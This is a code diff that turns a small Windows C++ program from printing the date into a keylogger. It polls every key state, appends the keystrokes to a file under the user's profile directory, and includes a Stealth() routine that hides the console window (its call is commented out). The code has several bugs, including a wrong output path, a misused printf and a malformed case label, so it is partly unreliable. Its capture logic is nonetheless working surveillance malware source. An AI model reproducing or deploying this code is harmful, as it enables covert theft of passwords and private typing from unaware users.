@@ -1,12 +1,20 @@
 #include <iostream>
 #include <Windows.h>
 #include <string>
+#include <winuser.h>
+#include <fstream>
 
 /// <summary>
-/// Prototype 
+/// Function to save the logs
 /// </summary>
+/// <param name="key_stroke">key</param>
+/// <param name="file">output file</param>
 /// <returns></returns>
-std::string GetTime();
+int SaveLogs(int key_stroke, const char* file);
+/// <summary>
+/// Function to hidden the keylogger
+/// </summary>
+void Stealth();
 
 /// <summary>
 /// Main
@@ -14,38 +22,100 @@ std::string GetTime();
 /// <returns></returns>
 int main() 
 {
-	std::string date = GetTime();
+	//Stealth();
+	char i;
+	const char* userProfile = std::getenv("USERPROFILE");
 
-	printf(date.c_str());
+	//userProfile += "\\log.txt";
+
+	while (1)
+	{
+		for (i = 8; i <= 190; i++)
+		{
+			if (GetAsyncKeyState(i) == -32767)
+			{
+				SaveLogs(i, userProfile);
+			}
+		}
+	}
 }
 
 /// <summary>
-/// Get the current time
+/// Function to save the logs
 /// </summary>
-/// <returns>return actual time</returns>
-std::string GetTime()
+/// <param name="key_stroke">key</param>
+/// <param name="file">output file</param>
+/// <returns></returns>
+int SaveLogs(int key_stroke, const char* file)
 {
-	SYSTEMTIME st;
-	GetLocalTime(&st);
+	if ((key_stroke == 1) || (key_stroke == 2))
+	{
+		return 0;
+	}
 
-	int year = st.wYear;
-	int month = st.wMonth;
-	int day = st.wDay;
-	int hour = st.wHour;
-	int minute = st.wMinute;
+	FILE* OUTPUT_FILE;
+	OUTPUT_FILE = fopen(file, "a");
 
-	std::string yearS = std::to_string(year);
-	yearS += " - ";
-	std::string monthS = std::to_string(month);
-	monthS += ".";
-	std::string dayS = std::to_string(day);
-	dayS += ".";
-	std::string hourS = std::to_string(hour);
-	hourS += "h";
-	std::string minuteS = std::to_string(minute);
+	printf(key_stroke + "\n");
 
-	std::string startDate = "\n";
-	startDate += dayS + monthS + yearS + hourS + minuteS;
+	switch (key_stroke)
+	{
+		case 8:
+			fprintf(OUTPUT_FILE, "%s", "[BACKSPACE]");
+			break;
+		case 13:
+			fprintf(OUTPUT_FILE, "%s", "n");
+			break;
+		case 32:
+			fprintf(OUTPUT_FILE, "%s", " ");
+			break;
+		case VK_TAB:
+			fprintf(OUTPUT_FILE, "%s", "[TAB]");
+			break;
+		case VK_SHIFT:
+			fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
+			break;
+		case VK_CONTROL:
+			fprintf(OUTPUT_FILE, "%s", "[CONTROL]");
+			break;
+		case VK_ESCAPE:
+			fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
+			break;
+		case VK_END:
+			fprintf(OUTPUT_FILE, "%s", "[END]");
+			break;
+		case VK_HOME:
+			fprintf(OUTPUT_FILE, "%s", "[HOME]");
+			break;
+		case VK_LEFT:
+			fprintf(OUTPUT_FILE, "%s", "[LEFT]");
+			break;
+		case VK_UP:
+			fprintf(OUTPUT_FILE, "%s", "[UP]");
+			break;
+		case VK_RIGHT:
+			fprintf(OUTPUT_FILE, "%s", "[RIGHT]");
+			break;
+		case VK_DOWN:
+			fprintf(OUTPUT_FILE, "%s", "[DOWN]");
+			break;
+		case 190 || 110:
+			fprintf(OUTPUT_FILE, "%s", ".");
+		default:
+			fprintf(OUTPUT_FILE, "%c", (char)key_stroke);
+			break;
+	}
+	fclose(OUTPUT_FILE);
+	return 0;
+}
 
-	return startDate;
+/// <summary>
+/// Stealth function
+/// </summary>
+void Stealth()
+{
+	HWND Stealth;
+	AllocConsole();
+	Stealth = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(Stealth, 0);
 }
